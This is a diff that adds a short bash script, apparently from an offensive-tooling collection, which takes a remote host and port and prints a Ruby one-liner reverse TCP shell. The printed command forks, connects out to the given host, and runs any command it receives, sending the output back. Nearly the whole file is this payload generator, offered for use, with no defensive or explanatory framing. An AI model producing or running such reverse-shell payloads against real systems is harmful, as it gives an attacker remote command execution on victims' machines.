@@ -1,0 +1,21 @@
+#!/bin/bash
+
+function Craft_linux_ruby_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux ruby reverse tcp shell\n"
+                printf "Usage bash linux_ruby-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+        printf "\n"
+	printf "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$rhost\",\"$rport\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+Craft_linux_ruby_reverse_shell "$1" "$2"
